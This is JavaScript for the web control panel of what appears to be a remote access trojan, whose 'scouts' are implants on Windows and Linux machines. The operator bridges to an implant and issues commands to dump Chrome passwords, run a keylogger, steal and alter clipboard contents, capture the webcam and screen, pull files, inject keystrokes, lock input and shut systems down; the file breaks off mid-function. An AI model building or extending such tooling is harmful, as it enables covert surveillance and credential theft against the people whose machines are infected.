ScoutGlobals = {
    "ifc": "",
    "scoutButtonInFocus": false,
    "nameSentToServer": false,
    "reloadedPage": true,
    "isMonitorRunning": "",
    "idOfSelectedButton": "-1",
    "sleepTimeSentToServer": false,
    "canSend": false,
    "$this": undefined,
    "bridgedId": "-1",
    "error": true,
    "readOnlyLength": 4,
    "scoutOS": undefined
};
$(document).ready(function () {
    // SCOUTS INTERFACE !!
    function onStart () {
        $("#div_scouts_table_heading").hide();
        $("#div_scouts_table").hide();
        $("#div_direct_lin").hide();
        $("#div_direct_win").hide();
        $("#div_console").hide();
        loader("-1");
        ScoutGlobals.ifc = "Scouts";
    }
    onStart();

    $(document).on('focusout', '.td_scouts_table_name', function () {
        if ($(this).text() !== "" && !ScoutGlobals.scoutButtonInFocus) {
            if (!ScoutGlobals.nameSentToServer) {
                ScoutGlobals.nameSentToServer = true;
                triggerAjax("rename " + $(this).attr('id').split('_')[4] + " " + $(this).text(), true, '/scouts_process', pauseCB, {});
            }
        }
    });
    function pauseCB(data) {
        if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }

    $(".button_scouts_table").click(function() {
        ScoutGlobals.scoutButtonInFocus = true;
        ScoutGlobals.canSend = true;
        tableRowClickable(true);
        loader($(this).attr('id').split('_')[4]);
        ScoutGlobals.$this = $(this);
        $("body").off("click", "#table_scouts tr");
        $("body").on("click", "#table_scouts tr", function(){
            if (ScoutGlobals.canSend && ScoutGlobals.$this.attr('id') !== "button_scouts_table_bridge_0") {
                ScoutGlobals.canSend = false;
                $(".button_scouts_table").prop('disabled', true);
                ScoutGlobals.idOfSelectedButton = ScoutGlobals.$this.attr('id').split('_')[4];
                let command = ScoutGlobals.$this.attr('id').split('_')[3];
                let rowId = $(this).attr('id').split('_')[3];
                $("#i_scouts_table_spinner_" + rowId).show();
                if (command === "sleep") {
                    $("#div_scouts_table_sleep").show();
                    $("#button_scouts_table_scout_sleep_time").click(function() {
                        let time;
                        if ($("#input_scouts_table_scout_sleep_time").val() !== "") {
                            if (parseInt($("#input_scouts_table_scout_sleep_time").val(), 10) > 0) {
                                time = String($("#input_scouts_table_scout_sleep_time").val());
                            }
                            else {
                                time = "10";
                            }
                        } else {
                            time = "10";
                        }
                        $("#input_scouts_table_scout_sleep_time").val("");
                        $("#div_scouts_table_sleep").hide();
                        triggerAjax(command +  " " + rowId + " " + time, true, '/scouts_process', sleepScoutFunctionCB, {"rowId": rowId});
                    });
                    $(".button_scouts_table").prop('disabled', false);
                    return;
                }
                triggerAjax(command +  " " + rowId, true, '/scouts_process', standardScoutFunctionCB, {'command': command, "rowId": rowId});
            }
        });
    });
    function sleepScoutFunctionCB(data, extra_input) {
        ScoutGlobals.idOfSelectedButton = "-1";
        ScoutGlobals.scoutButtonInFocus = false;
        tableRowClickable(false);
        loader("-1");
        $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
        $("body").off("click", "#table_scouts tr")
    }
    function standardScoutFunctionCB(data, extra_input) {
        ScoutGlobals.scoutButtonInFocus = false;
        tableRowClickable(false);
        loader("-1");
        $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
        if (extra_input.command === "ping") {
            if (data.output === "Success") {
                ScoutGlobals.error = false;
                showMessage(data.output_message);
                scrollToTop();
            } else {
                ScoutGlobals.error = true;
                showMessage(data.output_message);
                scrollToTop();
            }
        }
        $(".button_scouts_table").prop('disabled', false);
        ScoutGlobals.idOfSelectedButton = "-1";
        $("body").off("click", "#table_scouts tr")
    }

    // BRIDGING STUFF !!
    $('#button_scouts_table_bridge_0').click(function() {
        ScoutGlobals.idOfSelectedButton = "0";
        ScoutGlobals.scoutButtonInFocus = true;
        ScoutGlobals.canSend = true;
        tableRowClickable(true);
        loader("0");
        $("body").off("click", "#table_scouts tr");
        $("body").on("click", "#table_scouts tr", function(){
            if (ScoutGlobals.idOfSelectedButton === "0" && $(this).attr('id') !== "tr_scouts_heading") {
                let rowId = $(this).attr('id').split('_')[3];
                $("#i_scouts_table_spinner_" + rowId).show();
                triggerAjax("bridge " + rowId, true, '/scouts_process', bridgeScoutFunctionCB, {});
            }
        });
    });
    function bridgeScoutFunctionCB(data){
        if (data.output === "Success") {
            ScoutGlobals.scoutButtonInFocus = false;
            ScoutGlobals.idOfSelectedButton = "-1";
            ScoutGlobals.bridgedId = data.data[0];
            ScoutGlobals.ifc = "Direct";

            $(".i_scouts_table_spinner").hide();
            tableRowClickable(false);

            $("#h1_scouts_heading").text("Scout >> " + data.data[1]);
            $("#div_scouts").hide();
            $("#div_console").show();

            loader("-1");

            $("#p_console_output").html("");
            logToConsole("[*]Loading available functions...", true);

            displaySelectedFunctions("");
            displayComponents("");

            triggerAjaxDirectInterface("help", true, loadScoutFunctionsCB, undefined)
        } else {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
        }
    }
    function loadScoutFunctionsCB(data) {
        if (data.output === "Success") {
            $("body").off("click", "#table_scouts tr");
            highlightAvailableFunctions(data.data);
            if (ScoutGlobals.scoutOS === "win") {
                $("#div_direct_win").show();
            } else if (ScoutGlobals.scoutOS === "lin") {
                $("#div_direct_lin").show();
            } else {
            }

            loaderDirect("-1");

            $("#div_direct_classify_win").hide();
            $("#div_direct_classify_lin").hide();
            $("#div_direct_components_win").show();
            $("#div_direct_components_lin").show();
            $(".div_component_win").hide();
            $(".div_component_lin").hide();
            $("#button_direct_components_win_back").hide();
            $("#button_direct_components_lin_back").hide();

            logToConsole("[+]Available functions loaded", true);
            displaySelectedFunctions("base")
            logToConsole("", false, true);
        } else {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
            switchToScoutIFC();
        }
    }


    $(".button_direct_classify_win_base").click(function () {
        let command = $(this).attr('id').split('_')[5];
        let id = $(this).attr('id').split('_')[6];
        loaderDirect(id);
        if (command === "sleep") {
            if (!ScoutGlobals.sleepTimeSentToServer) {
                ScoutGlobals.sleepTimeSentToServer = true;
                $("#div_direct_sleep").show();
                $("#button_direct_scout_sleep_time").unbind("click").click(function () {
                    let time;
                    if ($("#input_direct_scout_sleep_time").val() !== "") {
                        if (parseInt($("#input_direct_scout_sleep_time").val(), 10) > 0) {
                            time = String($("#input_direct_scout_sleep_time").val());
                        } else {
                            time = "10";
                        }
                    } else {
                        time = "10";
                    }
                    $("#input_direct_scout_sleep_time").val("");
                    $("#div_direct_sleep").hide();
                    triggerAjaxDirectInterface(command + " " + time, true, sleepDirectButtonCB, {});
                });
                $(".button_direct_classify_win_base").prop('disabled', false);
            }
            return;
        }
        triggerAjaxDirectInterface(command, true, standardDirectButtonCB, {"command": command});
    });
    $(".button_direct_classify_lin_base").click(function () {
        let command = $(this).attr('id').split('_')[4];
        let id = $(this).attr('id').split('_')[5];
        loaderDirect(id);
        if (command === "sleep") {
            if (!ScoutGlobals.sleepTimeSentToServer) {
                ScoutGlobals.sleepTimeSentToServer = true;
                $("#div_direct_sleep").show();
                $("#button_direct_scout_sleep_time").unbind("click").click(function () {
                    let time;
                    if ($("#input_direct_scout_sleep_time").val() !== "") {
                        if (parseInt($("#input_direct_scout_sleep_time").val(), 10) > 0) {
                            time = String($("#input_direct_scout_sleep_time").val());
                        } else {
                            time = "10";
                        }
                    } else {
                        time = "10";
                    }
                    $("#input_direct_scout_sleep_time").val("");
                    $("#div_direct_sleep").hide();
                    triggerAjaxDirectInterface(command + " " + time, true, sleepDirectButtonCB, {});
                });
                $(".button_direct_classify_lin_base").prop('disabled', false);
            }
            return;
        }
        triggerAjaxDirectInterface(command, true, standardDirectButtonCB, {"command": command});
    });
    function standardDirectButtonCB(data, extra_input) {
        if (data.output === "Success") {
            if (data.output_message === "return") {
                if (extra_input.command === "ping"){
                    ScoutGlobals.error = true;
                    showMessage("Scout is dead, removing from database...");
                    scrollToTop();
                }
                ScoutGlobals.ifc = "Scouts";
                loaderDirect("-1");
            } else {
                if (extra_input.command === "ping"){
                    ScoutGlobals.error = false;
                    showMessage(data.output_message);
                    scrollToTop();
                }
                loaderDirect("-1");
            }
        }
    }
    function sleepDirectButtonCB(data) {
        if (data.output_message === "return") {
            ScoutGlobals.sleepTimeSentToServer = false;
            ScoutGlobals.ifc = "Scouts";
            loaderDirect("-1");
        }
    }

    $("#button_direct_classify_win_main_base").click(function () {
       displaySelectedFunctions("base");
    });
    $("#button_direct_classify_win_main_read").click(function () {
       displaySelectedFunctions("read");
    });
    $("#button_direct_classify_win_main_write").click(function () {
       displaySelectedFunctions("write");
    });
    $("#button_direct_classify_win_main_execute").click(function () {
       displaySelectedFunctions("execute");
    });
    $("#button_direct_classify_win_main_persist").click(function () {
       displaySelectedFunctions("persist");
    });

    $("#button_direct_classify_lin_main_base").click(function () {
       displaySelectedFunctions("base");
    });
    $("#button_direct_classify_lin_main_read").click(function () {
       displaySelectedFunctions("read");
    });
    $("#button_direct_classify_lin_main_write").click(function () {
       displaySelectedFunctions("write");
    });
    $("#button_direct_classify_lin_main_execute").click(function () {
       displaySelectedFunctions("execute");
    });
    $("#button_direct_classify_lin_main_persist").click(function () {
       displaySelectedFunctions("persist");
    });

    $("#button_direct_components_win_back").click(function () {
       displayComponents("");
       $("#button_direct_components_win_back").hide();
       $("#div_direct_classify_win").show();
    });
    $("#button_direct_components_lin_back").click(function () {
       displayComponents("");
       $("#button_direct_components_lin_back").hide();
       $("#div_direct_classify_lin").show();
    });

    function logOutputCB(data, extra_input=undefined) {
        if (data.output === "Success") {
            if (extra_input) {
                if (extra_input.command !== "help_command")
                    if (data.output_message === "return") {
                        if (extra_input.command === "ping"){
                            ScoutGlobals.error = true;
                            showMessage("Scout is dead, removing from database...");
                            scrollToTop();
                        }
                        ScoutGlobals.ifc = "Scouts";
                        loaderDirect("-1");
                    } else {
                        if (extra_input.command === "ping"){
                            ScoutGlobals.error = false;
                            showMessage(data.output_message);
                            scrollToTop();
                        }
                        loaderDirect("-1");
                    }
                else {
                    logToConsole(data.data, true, false,true);
                }
            }
            else {
                logToConsole(data.data, true);
            }
            logToConsole("", false, true);
        } else if (data.output === "Fail") {
            ScoutGlobals.error = true;
            showMessage(data.output_message);
            scrollToTop();
            switchToScoutIFC();
        }
    }



    $("#button_direct_classify_win_read_activeWindowsDump").click(function () {
        displaySelectedFunctions("read");
        displayComponents("activeWindowsDump");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_activeWindowsDump").click(function () {
        $(".input_console_command").last().val("active");
        $(".input_console_command").last().attr("readonly", true);
        triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_activeWindowsDump").click(function () {
        displaySelectedFunctions("read");
        displayComponents("activeWindowsDump");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_activeWindowsDump").click(function () {
        $(".input_console_command").last().val("active");
        triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_checkAdmin").click(function () {
        displaySelectedFunctions("read");
        displayComponents("checkAdmin");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_checkAdmin").click(function () {
        $(".input_console_command").last().val("admin");
        triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_checkAdmin").click(function () {
        displaySelectedFunctions("read");
        displayComponents("checkAdmin");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_checkAdmin").click(function () {
        $(".input_console_command").last().val("admin");
        triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_chromePasswordDump").click(function () {
        displaySelectedFunctions("read");
        displayComponents("chromePasswordDump");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_chromePasswordDump_active").click(function () {
        $(".input_console_command").last().val("chromedump active");
        triggerAjaxDirectInterface("chromedump active", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_chromePasswordDump_passive").click(function () {
        $(".input_console_command").last().val("chromedump passive");
        triggerAjaxDirectInterface("chromedump passive", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_clipLogger").click(function () {
        displaySelectedFunctions("read");
        displayComponents("clipLogger");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_clipLogger_clear").click(function () {
        $(".input_console_command").last().val("clip_clear");
        triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_clipLogger_dump").click(function () {
        $(".input_console_command").last().val("clip_dump");
        triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_clipLogger_set").click(function () {
        if ($("#input_direct_components_win_clipLogger_set").val() !== "") {
            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true);
            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_clipLogger_set").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_read_clipLogger").click(function () {
        displaySelectedFunctions("read");
        displayComponents("clipLogger");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_clipLogger_clear").click(function () {
        $(".input_console_command").last().val("clip_clear");
        triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
    });
    $("#button_direct_components_lin_clipLogger_dump").click(function () {
        $(".input_console_command").last().val("clip_dump");
        triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
    });
    $("#button_direct_components_lin_clipLogger_set").click(function () {
        if ($("#input_direct_components_lin_clipLogger_set").val() !== "") {
            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true);
            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_clipLogger_set").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_read_downloadFile").click(function () {
        displaySelectedFunctions("read");
        displayComponents("downloadFile");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_downloadFile").click(function () {
        if ($("#input_direct_components_win_downloadFile").val() !== "") {
            $(".input_console_command").last().val("download " + $("#input_direct_components_win_downloadFile").val(), true);
            triggerAjaxDirectInterface("download " + $("#input_direct_components_win_downloadFile").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_downloadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_read_downloadFile").click(function () {
        displaySelectedFunctions("read");
        displayComponents("downloadFile");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_downloadFile").click(function () {
        if ($("#input_direct_components_lin_downloadFile").val() !== "") {
            $(".input_console_command").last().val("download " + $("#input_direct_components_lin_downloadFile").val(), true);
            triggerAjaxDirectInterface("download " + $("#input_direct_components_lin_downloadFile").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_downloadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_read_downloadWeb").click(function () {
        displaySelectedFunctions("read");
        displayComponents("downloadWeb");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_downloadWeb").click(function () {
        if ($("#input_direct_components_win_downloadWeb_directory").val() !== "" && $("#input_direct_components_win_downloadWeb_url").val() !== "") {
            $(".input_console_command").last().val("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true);
            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_downloadWeb_directory").val("");
            $("#input_direct_components_win_downloadWeb_url").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory / url");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_read_downloadWeb").click(function () {
        displaySelectedFunctions("read");
        displayComponents("downloadWeb");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_downloadWeb").click(function () {
        if ($("#input_direct_components_lin_downloadWeb_directory").val() !== "" && $("#input_direct_components_lin_downloadWeb_url").val() !== "") {
            $(".input_console_command").last().val("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true);
            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_downloadWeb_directory").val("");
            $("#input_direct_components_lin_downloadWeb_url").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory / url");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_read_getIdle").click(function () {
        displaySelectedFunctions("read");
        displayComponents("getIdle");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_getIdle").click(function () {
        $(".input_console_command").last().val("idle");
        triggerAjaxDirectInterface("idle", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_screenshot").click(function () {
        displaySelectedFunctions("read");
        displayComponents("screenshot");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_screenshot").click(function () {
        $(".input_console_command").last().val("screen");
        triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_screenshot").click(function () {
        displaySelectedFunctions("read");
        displayComponents("screenshot");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_screenshot").click(function () {
        $(".input_console_command").last().val("screen");
        triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_webcam").click(function () {
        displaySelectedFunctions("read");
        displayComponents("webcam");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_webcam").click(function () {
        $(".input_console_command").last().val("webcam");
        triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_webcam").click(function () {
        displaySelectedFunctions("read");
        displayComponents("webcam");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_webcam").click(function () {
        $(".input_console_command").last().val("webcam");
        triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_logger").click(function () {
        displaySelectedFunctions("read");
        displayComponents("logger");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_logger_start").click(function () {
        $(".input_console_command").last().val("key_start");
        triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_logger_stop").click(function () {
        $(".input_console_command").last().val("key_stop");
        triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_logger_dump").click(function () {
        $(".input_console_command").last().val("key_dump");
        triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_logger").click(function () {
        displaySelectedFunctions("read");
        displayComponents("logger");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_logger_start").click(function () {
        $(".input_console_command").last().val("key_start");
        triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
    });
    $("#button_direct_components_lin_logger_stop").click(function () {
        $(".input_console_command").last().val("key_stop");
        triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
    });
    $("#button_direct_components_lin_logger_dump").click(function () {
        $(".input_console_command").last().val("key_dump");
        triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_read_systemInfo").click(function () {
        displaySelectedFunctions("read");
        displayComponents("systemInfo");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_systemInfo").click(function () {
        $(".input_console_command").last().val("sysinfo");
        triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_read_systemInfo").click(function () {
        displaySelectedFunctions("read");
        displayComponents("systemInfo");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_systemInfo").click(function () {
        $(".input_console_command").last().val("sysinfo");
        triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_write_browser").click(function () {
        displaySelectedFunctions("write");
        displayComponents("browser");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_browser").click(function () {
        if ($("#input_direct_components_win_browser").val() !== "") {
            $(".input_console_command").last().val("browse " + $("#input_direct_components_win_browser").val(), true);
            triggerAjaxDirectInterface("browse " + $("#input_direct_components_win_browser").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_browser").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid url");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_write_injectKeystrokes").click(function () {
        displaySelectedFunctions("write");
        displayComponents("injectKeystrokes");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_injectKeystrokes_get").click(function () {
        $(".input_console_command").last().val("inj_valid");
        triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
    });
    $("#button_direct_components_win_injectKeystrokes_text").click(function () {
        if ($("#input_direct_components_win_injectKeystrokes_text").val() !== "") {
            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true);
            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_injectKeystrokes_text").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_win_injectKeystrokes_button").click(function () {
        if ($("#input_direct_components_win_injectKeystrokes_button").val() !== "") {
            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true);
            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_injectKeystrokes_button").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_win_injectKeystrokes_combination").click(function () {
        if ($("#input_direct_components_win_injectKeystrokes_combination").val() !== "") {
            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true);
            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_injectKeystrokes_combination").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid hotkey combination");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_write_injectKeystrokes").click(function () {
        displaySelectedFunctions("write");
        displayComponents("injectKeystrokes");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_injectKeystrokes_get").click(function () {
        $(".input_console_command").last().val("inj_valid");
        triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
    });
    $("#button_direct_components_lin_injectKeystrokes_text").click(function () {
        if ($("#input_direct_components_lin_injectKeystrokes_text").val() !== "") {
            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true);
            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_injectKeystrokes_text").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_lin_injectKeystrokes_button").click(function () {
        if ($("#input_direct_components_lin_injectKeystrokes_button").val() !== "") {
            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true);
            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_injectKeystrokes_button").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid string");
            scrollToTop();
        }
    });
    $("#button_direct_components_lin_injectKeystrokes_combination").click(function () {
        if ($("#input_direct_components_lin_injectKeystrokes_combination").val() !== "") {
            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true);
            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_injectKeystrokes_combination").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid hotkey combination");
            scrollToTop();
        }
    });
    function injectKeystrokesGetCB(data) {
        let $selector = $("#p_console_output");
        let appendString;
        appendString = data.data.toString().replace("[*]", "<p1 style='color: #3b78ff'>[*]</p1>");
        appendString = String.raw`${appendString}`;
        appendString = appendString.replace(/\n/g, "<br>");
        appendString = appendString + "<br>";
        $selector.append(appendString);
        $selector.scrollTop($selector.prop("scrollHeight"));
    }



    $("#button_direct_classify_win_write_interfaceLock").click(function () {
        displaySelectedFunctions("write");
        displayComponents("interfaceLock");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_interfaceLock_lock_keyboard").click(function () {
        $(".input_console_command").last().val("inter_lock key");
        triggerAjaxDirectInterface("inter_lock key", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_interfaceLock_lock_mouse").click(function () {
        $(".input_console_command").last().val("inter_lock mouse");
        triggerAjaxDirectInterface("inter_lock mouse", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_interfaceLock_unlock_keyboard").click(function () {
        $(".input_console_command").last().val("inter_unlock key");
        triggerAjaxDirectInterface("inter_unlock key", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_interfaceLock_unlock_mouse").click(function () {
        $(".input_console_command").last().val("inter_unlock mouse");
        triggerAjaxDirectInterface("inter_unlock mouse", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_write_setAudio").click(function () {
        displaySelectedFunctions("write");
        displayComponents("setAudio");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_setAudio_get").click(function () {
        $(".input_console_command").last().val("set_audio_range");
        triggerAjaxDirectInterface("set_audio_range", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_setAudio_set").click(function () {
        if ($("#input_direct_components_win_setAudio_set").val() !== "") {
            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true);
            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_setAudio_set").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid decibel level");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_write_setAudio").click(function () {
        displaySelectedFunctions("write");
        displayComponents("setAudio");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_setAudio").click(function () {
        if ($("#input_direct_components_lin_setAudio").val() !== "") {
            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_lin_setAudio").val(), true);
            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_lin_setAudio").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_setAudio").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid percentage");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_write_systemStatusChange").click(function () {
        displaySelectedFunctions("write");
        displayComponents("systemStatusChange");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_systemStatusChange_lock").click(function () {
        $(".input_console_command").last().val("lock");
        triggerAjaxDirectInterface("lock", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_systemStatusChange_logout").click(function () {
        $(".input_console_command").last().val("logout");
        triggerAjaxDirectInterface("logout", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_systemStatusChange_restart").click(function () {
        $(".input_console_command").last().val("restart");
        triggerAjaxDirectInterface("restart", true, logOutputCB, undefined);
    });
    $("#button_direct_components_win_systemStatusChange_shutdown").click(function () {
        $(".input_console_command").last().val("shutdown");
        triggerAjaxDirectInterface("shutdown", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_write_uploadFile").click(function () {
        displaySelectedFunctions("write");
        displayComponents("uploadFile");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_uploadFile").click(function () {
        if ($("#input_direct_components_win_uploadFile").val() !== "") {
            $(".input_console_command").last().val("upload " + $("#input_direct_components_win_uploadFile").val(), true);
            triggerAjaxDirectInterface("upload " + $("#input_direct_components_win_uploadFile").val(), true, logOutputCB, undefined);
